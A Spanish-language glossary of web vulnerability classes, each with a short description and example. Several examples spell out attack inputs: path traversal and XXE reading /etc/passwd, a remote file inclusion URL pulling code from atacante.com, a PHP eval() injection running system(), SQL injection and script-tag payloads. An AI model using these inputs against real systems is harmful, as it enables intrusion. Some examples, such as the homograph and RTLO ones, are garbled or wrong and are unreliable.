## Server Security Misconfiguration


### Server-Side Request Forgery (SSRF)

**Descripción**: SSRF permite a un atacante hacer que el servidor realice solicitudes a dominios arbitrarios, pudiendo acceder a recursos internos.

**Ejemplo**: Un atacante podría enviar una solicitud que el servidor procesa, pero redirige internamente:

http

Copiar código

`http://victima.com/loadImage?url=http://interno/vulnerable`

### Internal High Impact

**Descripción**: Vulnerabilidades de alto impacto dentro de la red interna de una organización.

**Ejemplo**: Acceso no autorizado a bases de datos internas, permitiendo la extracción de información sensible.

### Internal Scan and/or Medium Impact

**Descripción**: Escaneos internos que revelan configuraciones incorrectas o vulnerabilidades de impacto medio.

**Ejemplo**: Un escaneo interno puede revelar servicios expuestos con configuraciones por defecto que permiten la ejecución de comandos.

### External - Low impact

**Descripción**: Vulnerabilidades de bajo impacto que afectan sistemas externos.

**Ejemplo**: Información de versión en encabezados HTTP que puede ayudar a un atacante a planificar un ataque.

### External - DNS Query Only

**Descripción**: Vulnerabilidades que permiten a un atacante realizar consultas DNS, pero con un impacto mínimo.

**Ejemplo**: Un atacante puede consultar registros DNS públicos de la organización para obtener información sobre la infraestructura.

### Unsafe Cross-Origin Resource Sharing (CORS)

**Descripción**: Configuraciones inseguras de CORS permiten que un sitio web acceda a recursos en otro dominio sin restricciones.

**Ejemplo**: Un sitio malicioso puede hacer solicitudes AJAX a tu servidor y acceder a datos sensibles.

### HTTP Request Smuggling

**Descripción**: Manipulación de encabezados HTTP que permite a un atacante interferir con la forma en que los servidores web y proxies manejan las solicitudes.

**Ejemplo**: Enviando una solicitud con una longitud de contenido incorrecta:

http

Copiar código

`POST / HTTP/1.1
Content-Length: 5

GET / HTTP/1.1
Host: victima.com`

### Path Traversal

**Descripción**: Permite a un atacante acceder a archivos y directorios fuera del directorio web raíz.

**Ejemplo**: Accediendo a `/etc/passwd` usando:

http

Copiar código

`http://victima.com/showfile?file=../../../../etc/passwd`

### Directory Listing Enabled

**Descripción**: Directorios en el servidor que muestran su contenido al acceder sin un archivo index.

**Ejemplo**: Accediendo a `http://victima.com/uploads/` y viendo todos los archivos subidos.

### Sensitive Data Exposure

**Descripción**: Información sensible (contraseñas, datos personales) expuesta debido a configuraciones incorrectas.

**Ejemplo**: Almacenamiento de contraseñas en texto plano en la base de datos.

### Non-Sensitive Data Exposure

**Descripción**: Datos no sensibles expuestos que, combinados con otros, pueden ser útiles para un atacante.

**Ejemplo**: Listas de usuarios con correos electrónicos, sin contraseñas.

### Same-Site Scripting

**Descripción**: Vulnerabilidades que permiten la ejecución de scripts en el mismo sitio, similar a XSS pero a nivel del servidor.

**Ejemplo**: Inserción de JavaScript en formularios de comentarios que se reflejan y ejecutan en el sitio.

### SSL Attack (BREACH, POODLE, etc.)

**Descripción**: Ataques que explotan vulnerabilidades en los protocolos SSL/TLS.

**Ejemplo**: POODLE explota la compatibilidad con SSL 3.0, permitiendo descifrar datos en texto claro.

### Using Default Credentials

**Descripción**: Uso de credenciales por defecto que permiten a un atacante acceder al sistema.

**Ejemplo**: Acceso al panel de administración con usuario "admin" y contraseña "admin".

### Misconfigured DNS

**Descripción**: Configuraciones DNS incorrectas que pueden llevar a diversos problemas de seguridad.

**Ejemplo**: Registros DNS que permiten transferencias de zona no autorizadas.

### Basic Subdomain Takeover

**Descripción**: Toma de subdominios debido a configuraciones incorrectas.

**Ejemplo**: Subdominios apuntando a servicios que ya no están en uso y pueden ser reclamados.

### High Impact Subdomain Takeover

**Descripción**: Toma de subdominios con un impacto alto, como acceso a servicios críticos.

**Ejemplo**: Control de subdominios utilizados para autenticación o servicios internos.

### Zone Transfer

**Descripción**: Permitir transferencias de zona DNS puede revelar la estructura interna de la red.

**Ejemplo**: Un atacante realiza una transferencia de zona para obtener todos los registros DNS de un dominio.

### Missing Certification Authority Authorization (CAA) Record

**Descripción**: Ausencia de registros CAA permite que cualquier CA emita certificados para el dominio.

**Ejemplo**: Un atacante puede obtener un certificado SSL de una CA no autorizada para suplantar el sitio.

### Mail Server Misconfiguration

**Descripción**: Configuraciones incorrectas del servidor de correo que pueden llevar a vulnerabilidades como el spam o spoofing.

**Ejemplo**: Servidor SMTP configurado como relay abierto.

### No Spoofing Protection on Email Domain

**Descripción**: Ausencia de protecciones que permiten a un atacante enviar correos falsificados desde el dominio.

**Ejemplo**: Falta de registros SPF o DKIM.

### Email Spoofing to Inbox due to Missing or Misconfigured DMARC on Email Domain

**Descripción**: DMARC mal configurado permite que correos falsificados lleguen a la bandeja de entrada.

**Ejemplo**: Correos de phishing que parecen venir de un dominio legítimo.

### Email Spoofing to Spam Folder

**Descripción**: DMARC configurado incorrectamente puede hacer que correos falsificados lleguen a la carpeta de spam.

**Ejemplo**: Correos de phishing dirigidos a la carpeta de spam, aumentando la probabilidad de ser abiertos por el usuario.

### Missing or Misconfigured SPF and/or DKIM

**Descripción**: Falta de registros SPF o DKIM, o configuración incorrecta, facilita el spoofing.

**Ejemplo**: Correos falsificados que pasan los filtros de spam.

### Email Spoofing on Non-Email Domain

**Descripción**: Uso de dominios que no envían correos para realizar ataques de spoofing.

**Ejemplo**: Uso de un subdominio de una organización para enviar correos de phishing.

### Database Management System (DBMS) Misconfiguration

**Descripción**: Configuraciones incorrectas en sistemas de gestión de bases de datos que pueden llevar a accesos no autorizados.

**Ejemplo**: Bases de datos expuestas a internet sin autenticación.

### Excessively Privileged User / DBA

**Descripción**: Usuarios con privilegios excesivos que pueden llevar a abusos.

**Ejemplo**: Cuentas de usuario con permisos de administrador innecesarios.

### Lack of Password Confirmation

**Descripción**: Falta de confirmación de contraseñas en cambios críticos.

**Ejemplo**: Cambios de correo electrónico o contraseñas sin solicitar la contraseña actual del usuario.

### Change Email Address

**Descripción**: Cambios de dirección de correo electrónico sin verificación adecuada.

**Ejemplo**: Permitir cambios de correo sin confirmar la nueva dirección, facilitando el secuestro de cuentas.

### Change Password

**Descripción**: Procesos de cambio de contraseña mal gestionados.

**Ejemplo**: Cambios de contraseña sin requerir la contraseña actual del usuario.

### Delete Account

**Descripción**: Eliminar cuentas sin confirmaciones adicionales.

**Ejemplo**: Permitir la eliminación de cuentas sin confirmar la identidad del usuario.

### Manage 2FA

**Descripción**: Gestión inadecuada de la autenticación de dos factores.

**Ejemplo**: Permitir la desactivación de 2FA sin confirmación adicional.

### No Rate Limiting on Form

**Descripción**: Falta de limitación de tasas en formularios, permitiendo ataques de fuerza bruta.

**Ejemplo**: Un formulario de inicio de sesión sin limitación de intentos.

### Registration

**Descripción**: Problemas en el proceso de registro que pueden ser explotados.

**Ejemplo**: Permitir registros masivos sin CAPTCHA, facilitando la creación de cuentas falsas.

### Login

**Descripción**: Problemas en el proceso de inicio de sesión.

**Ejemplo**: No bloquear intentos después de múltiples fallos de inicio de sesión.

### Email-Triggering

**Descripción**: Uso indebido de formularios que envían correos electrónicos.

**Ejemplo**: Formularios de contacto que pueden ser usados para enviar spam.

### SMS-Triggering

**Descripción**: Uso indebido de formularios que envían mensajes SMS.

**Ejemplo**: Formularios de verificación que permiten el envío masivo de SMS.

### Change Password

**Descripción**: Problemas específicos en el proceso de cambio de contraseña.

**Ejemplo**: Permitir cambios de contraseña sin notificar al usuario.

### Unsafe File Upload

**Descripción**: Permitir la subida de archivos peligrosos.

**Ejemplo**: Subida de archivos PHP que pueden ser ejecutados en el servidor.

### No Antivirus

**Descripción**: Falta de antivirus para escanear archivos subidos.

**Ejemplo**: Subida de archivos infectados con malware.

### No Size Limit

**Descripción**: Permitir la subida de archivos sin límite de tamaño.

**Ejemplo**: Subida de archivos extremadamente grandes que pueden agotar recursos del servidor.

### File Extension Filter Bypass

**Descripción**: Permitir la subida de archivos con extensiones peligrosas al omitir filtros.

**Ejemplo**: Renombrar un archivo `.php` a `.php.txt` para que pase el filtro y luego ser ejecutado.

### Cookie Scoped to Parent Domain

**Descripción**: Cookies accesibles desde el dominio padre, lo que puede ser un riesgo de seguridad.

**Ejemplo**: Una cookie en `sub.victima.com` accesible desde `victima.com`.

### Missing Secure or HTTPOnly Cookie Flag

**Descripción**: Falta de banderas `Secure` o `HTTPOnly` en cookies.

**Ejemplo**: Cookies que pueden ser accedidas por scripts de cliente o enviadas por HTTP en lugar de HTTPS.

### Session Token

**Descripción**: Problemas con los tokens de sesión.

**Ejemplo**: Uso de tokens de sesión predecibles.

### Non-Session Cookie

**Descripción**: Uso indebido de cookies no relacionadas con sesiones.

**Ejemplo**: Cookies que almacenan información sensible sin protección adecuada.

### Clickjacking

**Descripción**: Engañar al usuario para que haga clic en algo diferente a lo que percibe.

**Ejemplo**: Un iframe transparente sobre un botón de "Eliminar cuenta".

### Sensitive Click-Based Action

**Descripción**: Clickjacking en acciones sensibles.

**Ejemplo**: Hacer que un usuario elimine su cuenta al hacer clic en un enlace inocente.

### Form Input

**Descripción**: Clickjacking en formularios.

**Ejemplo**: Un iframe sobre un formulario de inicio de sesión.

### Non-Sensitive Action

**Descripción**: Clickjacking en acciones no sensibles.

**Ejemplo**: Clickjacking en un botón de "Me gusta".

### OAuth Misconfiguration

**Descripción**: Configuraciones incorrectas de OAuth que pueden ser explotadas.

**Ejemplo**: Redirección de URI insegura que permite ataques de redirección abierta.

### Account Takeover

**Descripción**: Métodos que permiten a un atacante tomar control de una cuenta.

**Ejemplo**: Secuestro de sesión usando tokens de restablecimiento de contraseña.

### Account Squatting

**Descripción**: Registro de cuentas con nombres de usuario deseados.

**Ejemplo**: Registrar `admin` antes que el administrador del sitio.

### Missing/Broken State Parameter

**Descripción**: Falta o incorrecta implementación del parámetro `state` en OAuth.

**Ejemplo**: Ataques de falsificación de solicitudes entre sitios (CSRF) debido a la ausencia del parámetro `state`.

### Insecure Redirect URI

**Descripción**: URI de redirección insegura en OAuth.

**Ejemplo**: Redirección a un sitio malicioso que puede robar tokens de acceso.

### CAPTCHA

**Descripción**: Implementación incorrecta de CAPTCHA.

**Ejemplo**: CAPTCHA que puede ser resuelto fácilmente por bots.

### Implementation Vulnerability

**Descripción**: Vulnerabilidades en la implementación de sistemas de CAPTCHA.

**Ejemplo**: CAPTCHA que puede ser saltado debido a validaciones del lado del cliente.

### Brute Force

**Descripción**: Ataques de fuerza bruta en formularios.

**Ejemplo**: Intentos ilimitados de adivinar contraseñas en un formulario de inicio de sesión.

### Missing

**Descripción**: Falta de medidas de protección contra ataques de fuerza bruta.

**Ejemplo**: No bloquear cuentas después de múltiples intentos fallidos.

### Exposed Admin Portal

**Descripción**: Portales de administración expuestos públicamente.

**Ejemplo**: Acceso no autorizado al panel de administración de un sitio web.

### To Internet

**Descripción**: Recursos internos expuestos a internet.

**Ejemplo**: Aplicaciones de intranet accesibles desde la red pública.

### Missing DNSSEC

**Descripción**: Falta de DNSSEC, que protege contra ataques de cache poisoning.

**Ejemplo**: Un atacante manipula la resolución DNS para redirigir el tráfico.

### Fingerprinting/Banner Disclosure

**Descripción**: Información de versiones de software y servicios en banners.

**Ejemplo**: Encabezados HTTP que revelan la versión del servidor web.

### Username/Email Enumeration

**Descripción**: Enumeración de nombres de usuario o correos electrónicos.

**Ejemplo**: Un formulario de inicio de sesión que revela si un usuario existe.

### Brute Force

**Descripción**: Ataques de fuerza bruta para adivinar credenciales.

**Ejemplo**: Intentos masivos de adivinación de contraseñas.

### Potentially Unsafe HTTP Method Enabled

**Descripción**: Métodos HTTP inseguros habilitados.

**Ejemplo**: Método `TRACE` habilitado que puede ser usado para ataques XST.

### OPTIONS

**Descripción**: Método OPTIONS habilitado que puede revelar métodos HTTP permitidos.

**Ejemplo**: Respuestas que revelan que `PUT` o `DELETE` están permitidos.

### TRACE

**Descripción**: Método TRACE habilitado, que puede ser usado para ataques de reflejo de mensajes.

**Ejemplo**: Usar TRACE para realizar Cross-Site Tracing (XST).

### Insecure SSL

**Descripción**: Configuraciones inseguras de SSL/TLS.

**Ejemplo**: Uso de cifrados débiles como RC4.

### Lack of Forward Secrecy

**Descripción**: Falta de PFS (Perfect Forward Secrecy) en SSL/TLS.

**Ejemplo**: Sesiones pasadas pueden ser descifradas si la clave privada del servidor se compromete.

### Insecure Cipher Suite

**Descripción**: Uso de suites de cifrado inseguras.

**Ejemplo**: Aceptación de cifrados obsoletos como DES.

### Certificate Error

**Descripción**: Errores en certificados SSL/TLS.

**Ejemplo**: Certificados caducados o mal configurados.

### Reflected File Download (RFD)

**Descripción**: Vulnerabilidad donde un atacante puede engañar al usuario para que descargue un archivo malicioso.

**Ejemplo**: Un enlace que genera un archivo malicioso al ser descargado por el navegador de la víctima.

### Lack of Security Headers

**Descripción**: Falta de cabeceras de seguridad en las respuestas HTTP.

**Ejemplo**: Falta de `X-Frame-Options`, permitiendo ataques de clickjacking.

### X-Frame-Options

**Descripción**: Falta de `X-Frame-Options`, permitiendo que el sitio sea embebido en iframes maliciosos.

**Ejemplo**: Permitir que un sitio sea embebido en un iframe para un ataque de clickjacking.

### Cache-Control for a Non-Sensitive Page

**Descripción**: Falta de cabecera `Cache-Control` para páginas no sensibles.

**Ejemplo**: Páginas públicas que no se cachean, afectando el rendimiento.

### X-XSS-Protection

**Descripción**: Falta de `X-XSS-Protection`, permitiendo ataques de XSS.

**Ejemplo**: Navegadores que no bloquean intentos de XSS sin esta cabecera.

### Strict-Transport-Security

**Descripción**: Falta de `Strict-Transport-Security` que asegura conexiones HTTPS.

**Ejemplo**: Permitir conexiones HTTP en sitios que deberían estar completamente en HTTPS.

### X-Content-Type-Options

**Descripción**: Falta de `X-Content-Type-Options`, permitiendo ataques de tipo MIME.

**Ejemplo**: Navegadores que interpretan incorrectamente el tipo de contenido.

### Content-Security-Policy

**Descripción**: Falta de `Content-Security-Policy` (CSP) que previene XSS y otros ataques.

**Ejemplo**: Permitir ejecución de scripts no confiables.

### Public-Key-Pins

**Descripción**: Falta de `Public-Key-Pins` para prevenir ataques MITM con certificados fraudulentos.

**Ejemplo**: Un atacante usa un certificado falso para interceptar tráfico HTTPS.

### X-Content-Security-Policy

**Descripción**: Falta de `X-Content-Security-Policy`, una versión anterior de CSP.

**Ejemplo**: Similar a CSP, pero para navegadores más antiguos.

### X-Webkit-CSP

**Descripción**: Falta de `X-Webkit-CSP`, una versión de CSP específica para WebKit.

**Ejemplo**: Aplicaciones que funcionan en navegadores WebKit sin protección CSP.

### Content-Security-Policy-Report-Only

**Descripción**: Uso de CSP en modo reporte para detectar problemas sin bloquear.

**Ejemplo**: Detectar violaciones CSP sin impedir el funcionamiento del sitio.

### Cache-Control for a Sensitive Page

**Descripción**: Falta de `Cache-Control` en páginas sensibles, permitiendo almacenamiento en caché inseguro.

**Ejemplo**: Páginas con información personal que se almacenan en caché.

### Web Application Firewall (WAF) Bypass

**Descripción**: Métodos para eludir firewalls de aplicaciones web.

**Ejemplo**: Usar técnicas de evasión para evitar detección por WAF.

### Direct Server Access

**Descripción**: Acceso directo a servidores que debería estar restringido.

**Ejemplo**: Acceso a servidores de base de datos directamente desde internet.

### Race Condition

**Descripción**: Problemas de concurrencia que permiten a un atacante manipular el comportamiento del sistema.

**Ejemplo**: Manipulación de transacciones financieras al ejecutar múltiples solicitudes simultáneas.

### Email Verification Bypass

**Descripción**: Saltar la verificación de correo electrónico.

**Ejemplo**: Permitir acceso a funcionalidades sin verificar el correo.

### Missing Subresource Integrity

**Descripción**: Falta de SRI (Subresource Integrity) que asegura la integridad de recursos cargados externamente.

**Ejemplo**: Un atacante modifica una librería JavaScript cargada desde un CDN.

### Software Package Takeover

**Descripción**: Tomar control de paquetes de software debido a configuraciones incorrectas.

**Ejemplo**: Publicar una versión maliciosa de un paquete en un repositorio público.

### Cache Poisoning

**Descripción**: Manipulación de cachés para entregar contenido malicioso.

**Ejemplo**: Envenenar la caché de un servidor DNS para redirigir a sitios maliciosos.

### Bitsquatting

**Descripción**: Registro de dominios con errores tipográficos o bitflips.

**Ejemplo**: Registrar `g00gle.com` para aprovechar errores de tipografía de los usuarios.

## Server-Side Injection

### File Inclusion

**Descripción**: Vulnerabilidad que permite a un atacante incluir archivos en el servidor.

#### Local

**Descripción**: Incluir archivos locales en el servidor, lo que puede llevar a la divulgación de información sensible.

**Ejemplo**: Si una aplicación web permite al usuario especificar un archivo para ser incluido:

php

Copiar código

`<?php include($_GET['file']); ?>`

Un atacante puede incluir `/etc/passwd`:

http

Copiar código

`http://victima.com/index.php?file=/etc/passwd`

#### Remote

**Descripción**: Incluir archivos remotos desde un servidor controlado por el atacante.

**Ejemplo**: Si la inclusión remota no está deshabilitada, un atacante puede incluir un archivo malicioso:

http

Copiar código

`http://victima.com/index.php?file=http://atacante.com/malicioso.php`

### Parameter Pollution

**Descripción**: Modificación de parámetros para causar comportamientos inesperados en la aplicación.

**Ejemplo**: Enviar múltiples valores para el mismo parámetro en una solicitud:

http

Copiar código

`http://victima.com/page?id=1&id=2`

El comportamiento puede variar dependiendo de cómo el servidor procese estos parámetros.

### Social Media Sharing Buttons

**Descripción**: Manipulación de botones de compartir en redes sociales para incluir contenido malicioso.

**Ejemplo**: Inyección de parámetros maliciosos en la URL de compartir:

http

Copiar código

`http://victima.com/share?url=http://atacante.com`

Esto puede dirigir a los usuarios a sitios maliciosos cuando comparten contenido.

### Remote Code Execution (RCE)

**Descripción**: Vulnerabilidad que permite a un atacante ejecutar código arbitrario en el servidor.

**Ejemplo**: Si una aplicación evalúa entradas del usuario sin validación adecuada:

php

Copiar código

`<?php eval($_GET['code']); ?>`

Un atacante puede ejecutar comandos:

http

Copiar código

`http://victima.com/index.php?code=system('ls');`

### LDAP Injection

**Descripción**: Manipulación de consultas LDAP para acceder o modificar datos sin autorización.

**Ejemplo**: Inyectar caracteres especiales en una consulta LDAP:

http

Copiar código

`(&(uid=admin)(userPassword=*)(|(uid=*)(password=*)))`

Esto puede devolver más datos de los que debería.

### SQL Injection

**Descripción**: Inyección de consultas SQL para manipular la base de datos.

**Ejemplo**: Entrada no validada en una consulta SQL:

sql

Copiar código

`SELECT * FROM usuarios WHERE nombre = 'admin' AND password = '';`

Un atacante puede inyectar:

sql

Copiar código

`' OR '1'='1`

Dando acceso a todos los usuarios.

### XML External Entity Injection (XXE)

**Descripción**: Inyección de entidades externas en documentos XML para acceder a archivos locales o realizar ataques SSRF.

**Ejemplo**: Un documento XML malicioso:

xml

Copiar código

`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`

Esto puede exponer el contenido de `/etc/passwd`.

### HTTP Response Manipulation

**Descripción**: Manipulación de respuestas HTTP para alterar la comunicación entre cliente y servidor.

#### Response Splitting (CRLF)

**Descripción**: Inyección de caracteres de control para dividir respuestas HTTP.

**Ejemplo**: Inyectar `\r\n` en encabezados HTTP:

http

Copiar código

`http://victima.com/page?param=%0d%0aSet-Cookie:%20malicious=value`

Esto puede manipular la respuesta y establecer cookies maliciosas.

### Content Spoofing

**Descripción**: Alteración del contenido que se muestra al usuario.

**Ejemplo**: Manipular parámetros para mostrar contenido diferente:

http

Copiar código

`http://victima.com/page?message=<script>alert('Hacked');</script>`

Puede llevar a mostrar scripts maliciosos.

### iframe Injection

**Descripción**: Inyección de iframes para cargar contenido de sitios externos.

**Ejemplo**: Inyectar un iframe malicioso:

html

Copiar código

`<iframe src="http://atacante.com"></iframe>`

Esto puede dirigir a los usuarios a sitios de phishing.

### Impersonation via Broken Link Hijacking

**Descripción**: Aprovechar enlaces rotos para redirigir a los usuarios a sitios controlados por el atacante.

**Ejemplo**: Reclamar un dominio que estaba enlazado en el sitio de la víctima:

http

Copiar código

`http://victima.com/link?url=http://dominio-expirado.com`

Esto puede ser usado para phishing.

### External Authentication Injection

**Descripción**: Manipulación de sistemas de autenticación externa para obtener acceso no autorizado.

**Ejemplo**: Inyección de parámetros en la autenticación OAuth:

http

Copiar código

`http://victima.com/auth?redirect_uri=http://atacante.com`

Puede redirigir tokens de autenticación al atacante.

### Flash Based External Authentication Injection

**Descripción**: Vulnerabilidades en autenticación basada en Flash que permiten inyecciones.

**Ejemplo**: Un archivo Flash malicioso que manipula la autenticación.

### HTML Content Injection

**Descripción**: Inyección de contenido HTML en páginas web.

**Ejemplo**: Inyectar HTML en formularios:

html

Copiar código

`<input type="text" name="nombre" value="<script>alert('Hacked');</script>">`

### Email HTML Injection

**Descripción**: Inyección de contenido HTML en correos electrónicos.

**Ejemplo**: Enviar un correo con HTML malicioso:

html

Copiar código

`<a href="http://atacante.com">Haz clic aquí</a>`

Puede dirigir a los usuarios a sitios de phishing.

### Email Hyperlink Injection Based on Email Provider

**Descripción**: Manipulación de enlaces en correos electrónicos basados en el proveedor de correo.

**Ejemplo**: Inyectar enlaces maliciosos en correos de confirmación:

html

Copiar código

`<a href="http://atacante.com">Verificar</a>`

### Text Injection

**Descripción**: Inyección de texto en aplicaciones.

**Ejemplo**: Inyectar texto en campos de entrada que no están correctamente sanitizados:

http

Copiar código

`http://victima.com/page?text=Texto%20malicioso`

#### Homograph/IDN-Based

**Descripción**: Uso de caracteres similares en diferentes alfabetos para engañar a los usuarios.

**Ejemplo**: Registrar un dominio como `paypa1.com` (con una "L" en lugar de una "1").

#### Right-to-Left Override (RTLO)

**Descripción**: Uso de caracteres RTLO para engañar a los usuarios sobre el tipo de archivo.

**Ejemplo**: Renombrar un archivo `evilcode.exe` a `eviltxt.exe` usando RTLO.

### Server-Side Template Injection (SSTI)

**Descripción**: Inyección de código en plantillas del lado del servidor.

**Ejemplo**: Inyectar código en una plantilla Jinja2:

python

Copiar código

`{{7*7}}`

Puede ejecutar código arbitrario en el servidor.

#### Basic

**Descripción**: Inyección básica en plantillas predefinidas.

**Ejemplo**: Inyectar `{{7*7}}` en una plantilla vulnerable.

#### Custom

**Descripción**: Inyección en plantillas personalizadas.

**Ejemplo**: Inyectar `{{config.items()}}` para exponer configuraciones internas.

## Broken Authentication and Session Management

### Authentication Bypass

**Descripción**: Vulnerabilidad que permite a un atacante eludir el proceso de autenticación.

**Ejemplo**: Un atacante puede modificar una cookie de sesión o parámetro de URL para obtener acceso no autorizado.

### Second Factor Authentication (2FA) Bypass

**Descripción**: Métodos para evitar la autenticación de segundo factor.

**Ejemplo**: Explotar una vulnerabilidad en la implementación de 2FA para omitir el segundo factor y acceder a la cuenta.

### Cleartext Transmission of Session Token

**Descripción**: Transmisión de tokens de sesión en texto claro.

**Ejemplo**: Enviar tokens de sesión en URLs o cookies sin cifrado (HTTP en lugar de HTTPS).

### Weak Login Function

**Descripción**: Función de inicio de sesión débil que puede ser explotada fácilmente.

**Ejemplo**: No limitar intentos de inicio de sesión o no usar mecanismos de protección como CAPTCHAs.

### Not Operational or Intended Public Access

**Descripción**: Recursos destinados a ser privados accesibles públicamente debido a configuraciones incorrectas.

**Ejemplo**: Un portal de administración accesible sin autenticación.

### Other Plaintext Protocol with no Secure Alternative

**Descripción**: Uso de protocolos en texto claro sin una alternativa segura disponible.

**Ejemplo**: Transmisión de credenciales a través de FTP en lugar de SFTP.

### Over HTTP

**Descripción**: Transmisión de información sensible sobre HTTP en lugar de HTTPS.

**Ejemplo**: Un formulario de inicio de sesión que envía credenciales a través de una conexión HTTP no segura.

### Session Fixation

**Descripción**: Permitir que un atacante fije una sesión válida en la víctima.

**Ejemplo**: Un atacante obtiene una sesión válida y engaña a la víctima para que use esa sesión.

### Remote Attack Vector

**Descripción**: Vector de ataque que puede ser explotado remotamente.

**Ejemplo**: Un atacante realiza un ataque de fijación de sesión desde un lugar remoto.

### Local Attack Vector

**Descripción**: Vector de ataque que requiere acceso local.

**Ejemplo**: Un atacante que tiene acceso físico a una máquina puede robar cookies de sesión.

### Failure to Invalidate Session

**Descripción**: No invalidar correctamente las sesiones en eventos críticos.

#### On Logout (Client and Server-Side)

**Descripción**: No invalidar la sesión tanto en el cliente como en el servidor al cerrar sesión.

**Ejemplo**: La sesión del usuario permanece activa en el servidor después de cerrar sesión en el cliente.

#### On Permission Change

**Descripción**: No invalidar la sesión cuando los permisos del usuario cambian.

**Ejemplo**: Un usuario que pierde permisos aún puede acceder a recursos restringidos hasta que cierre sesión.

#### On Logout (Server-Side Only)

**Descripción**: No invalidar la sesión en el servidor al cerrar sesión.

**Ejemplo**: El token de sesión sigue siendo válido en el servidor después de cerrar sesión.

#### On Password Reset and/or Change

**Descripción**: No invalidar la sesión al cambiar o restablecer la contraseña.

**Ejemplo**: Un atacante que roba una sesión puede seguir accediendo incluso después de que el usuario cambie su contraseña.

#### Concurrent Sessions On Logout

**Descripción**: No cerrar todas las sesiones concurrentes al cerrar sesión.

**Ejemplo**: Un usuario cierra sesión en un dispositivo, pero las sesiones en otros dispositivos permanecen activas.

#### On Email Change

**Descripción**: No invalidar la sesión al cambiar la dirección de correo electrónico.

**Ejemplo**: Un atacante que cambia el correo electrónico de la cuenta puede seguir accediendo con la sesión antigua.

#### On 2FA Activation/Change

**Descripción**: No invalidar la sesión al activar o cambiar 2FA.

**Ejemplo**: Un atacante puede seguir accediendo sin el segundo factor después de que el usuario active 2FA.

### Long Timeout

**Descripción**: Tiempo de expiración de sesión demasiado largo, aumentando el riesgo de secuestro de sesión.

**Ejemplo**: Sesiones que no expiran automáticamente durante horas o días.

### Concurrent Logins

**Descripción**: Permitir inicios de sesión concurrentes desde diferentes ubicaciones sin restricción.

**Ejemplo**: Un usuario puede iniciar sesión desde múltiples dispositivos simultáneamente, lo que facilita el secuestro de sesión.

### Weak Registration Implementation

**Descripción**: Implementación débil del proceso de registro que permite cuentas falsas o duplicadas.

**Ejemplo**: No verificar la dirección de correo electrónico durante el registro.

### Over HTTP

**Descripción**: Permitir registros a través de HTTP en lugar de HTTPS, exponiendo información sensible.

**Ejemplo**: Un formulario de registro que envía datos a través de una conexión no cifrada

##  Sensitive Data Exposure
### Disclosure of Secrets

**Descripción**: Exposición no autorizada de secretos o información sensible.

**Ejemplo**: Archivos de configuración expuestos que contienen claves API o contraseñas.

### For Publicly Accessible Asset

**Descripción**: Exposición de información sensible en activos accesibles públicamente.

**Ejemplo**: Un repositorio GitHub público que contiene claves de acceso a servicios.

### PII Leakage/Exposure

**Descripción**: Filtración o exposición de información de identificación personal (PII).

**Ejemplo**: Exponer nombres completos, direcciones, o números de seguridad social en una página web.

### For Internal Asset

**Descripción**: Exposición de información sensible en activos internos.

**Ejemplo**: Un servidor de desarrollo accesible públicamente que contiene datos sensibles.

### Pay-Per-Use Abuse

**Descripción**: Uso indebido de servicios de pago por uso debido a la exposición de información.

**Ejemplo**: Exponer una clave API de un servicio de pago, permitiendo su uso indebido.

### Intentionally Public, Sample or Invalid

**Descripción**: Información sensible hecha pública intencionalmente, muestra o inválida.

**Ejemplo**: Datos de muestra que contienen información sensible no anonimizados adecuadamente.

### Data/Traffic Spam

**Descripción**: Envío masivo de datos o tráfico malicioso.

**Ejemplo**: Un formulario de contacto expuesto que permite el envío de spam.

### Non-Corporate User

**Descripción**: Exposición de información de usuarios no corporativos.

**Ejemplo**: Publicación accidental de correos electrónicos personales de empleados.

### EXIF Geolocation Data Not Stripped From Uploaded Images

**Descripción**: Datos EXIF con información de geolocalización no eliminados de las imágenes subidas.

**Ejemplo**: Imágenes subidas a una red social que contienen datos de ubicación GPS.

### Automatic User Enumeration

**Descripción**: Enumeración automática de usuarios a través de respuestas del servidor.

**Ejemplo**: Una página de inicio de sesión que revela si un nombre de usuario existe o no.

### Manual User Enumeration

**Descripción**: Enumeración manual de usuarios a través de pruebas de ensayo y error.

**Ejemplo**: Intentar diferentes nombres de usuario en una página de registro y recibir mensajes de error específicos.

### Visible Detailed Error/Debug Page

**Descripción**: Páginas de error o depuración detalladas visibles para los usuarios.

**Ejemplo**: Una aplicación web que muestra una traza de pila detallada en caso de error.

### Detailed Server Configuration

**Descripción**: Exposición de configuraciones detalladas del servidor.

**Ejemplo**: Archivos de configuración del servidor accesibles públicamente que revelan rutas o configuraciones sensibles.

### Full Path Disclosure

**Descripción**: Divulgación de la ruta completa del servidor en respuestas de error.

**Ejemplo**: Mensajes de error que muestran la ruta completa del archivo en el servidor.

### Descriptive Stack Trace

**Descripción**: Exposición de trazas de pila descriptivas en caso de error.

**Ejemplo**: Una aplicación que muestra una traza de pila completa incluyendo información sobre la estructura interna del software.

### Disclosure of Known Public Information

**Descripción**: Exposición de información conocida públicamente pero aún potencialmente sensible.

**Ejemplo**: Listar nombres de usuario en una página pública aunque sean fácilmente obtenibles en otros lugares.

### Token Leakage via Referer

**Descripción**: Filtración de tokens a través del encabezado Referer.

**Ejemplo**: Un token de autenticación incluido en una URL que se envía en el encabezado Referer a otro sitio.

### Trusted 3rd Party

**Descripción**: Filtración de información sensible a una tercera parte de confianza.

**Ejemplo**: Compartir inadvertidamente tokens de sesión con un proveedor de análisis.

### Untrusted 3rd Party

**Descripción**: Filtración de información sensible a una tercera parte no confiable.

**Ejemplo**: Un script de terceros que recoge tokens de sesión.

### Over HTTP

**Descripción**: Transmisión de información sensible a través de HTTP en lugar de HTTPS.

**Ejemplo**: Enviar tokens de sesión en URLs o formularios no cifrados.

### Password Reset Token

**Descripción**: Exposición de tokens de restablecimiento de contraseña.

**Ejemplo**: Enviar un token de restablecimiento de contraseña en un enlace que puede ser interceptado.

### Sensitive Token in URL

**Descripción**: Incluir tokens sensibles en URLs.

**Ejemplo**: Un token de sesión en una URL que puede ser registrada en los historiales del navegador o en logs del servidor.

#### User Facing

**Descripción**: Tokens sensibles en URLs visibles para los usuarios.

**Ejemplo**: Mostrar tokens de autenticación en URLs en la barra de direcciones del navegador.

#### In the Background

**Descripción**: Tokens sensibles en URLs utilizadas en el fondo (background) de la aplicación.

**Ejemplo**: URLs de API que contienen tokens de sesión.

### On Password Reset

**Descripción**: Exposición de tokens durante el proceso de restablecimiento de contraseña.

**Ejemplo**: Un token de restablecimiento de contraseña incluido en un correo no cifrado.

### Non-Sensitive Token in URL

